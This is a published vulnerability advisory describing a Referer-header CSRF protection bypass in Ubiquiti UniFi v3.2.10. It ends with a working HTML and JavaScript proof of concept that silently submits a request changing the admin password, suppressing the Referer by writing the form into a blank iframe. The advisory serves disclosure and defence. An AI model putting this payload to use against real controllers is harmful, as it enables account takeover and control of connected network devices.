1. ADVISORY INFORMATION
-----------------------
Product:        Ubiquiti Networks UniFi
Vendor URL:     www.ubnt.com
Type:           Cross-Site Request Forgery [CWE-353]
Date found:     2015-03-19
Date published: 2016-02-23

CVE:            -


2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.


3. VERSIONS AFFECTED
--------------------
UniFi v3.2.10
older versions may be affected too.


4. INTRODUCTION
---------------
The UniFi® Controller software is a powerful, enterprise wireless software
engine ideal for high-density client deployments requiring low latency and
high uptime performance. A single UniFi Controller running in the cloud
can manage multiple sites: multiple, distributed deployments and
multi-tenancy for managed service providers.

(from the vendor's homepage)


5. VULNERABILITY DESCRIPTION
----------------------------
A generic Cross-Site Request Forgery protection bypass vulnerability was
identified in UniFi v3.2.10 and prior.

The application uses a CSRF protection, which is based on verifying the
Referer header, but does not catch the case where the Referer header
is completely missing.

This leads to a generic CSRF protection bypass, resulting in all
application specific functionalities becoming vulnerable. An attacker needs
to trick the victim to visit an arbitrary website in order to exploit the
vulnerability. Successful exploits can allow the attacker to compromise the
whole application including connected devices, e.g. by changing passwords
of users, adding new users, changing device usernames and passwords or by
creating new WLAN configurations.


6. PROOF-OF-CONCEPT
-------------------
The following PoC changes the password of the user "admin" to "csrfpwd":

<html>
<head>
<script>
function load() {
    var postdata = '<form id=csrf method=POST enctype=\'text\/plain\' action=\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\'>' +
                    '<input type=hidden name=\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40mail.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\' value=\'\' />' +
                    '</form>';
    top.frames[0].document.body.innerHTML=postdata;
    top.frames[0].document.getElementById('csrf').submit();
}
</script>
</head>
<body onload="load()">
<iframe src="about:blank" id="noreferer">< /iframe>
</body>
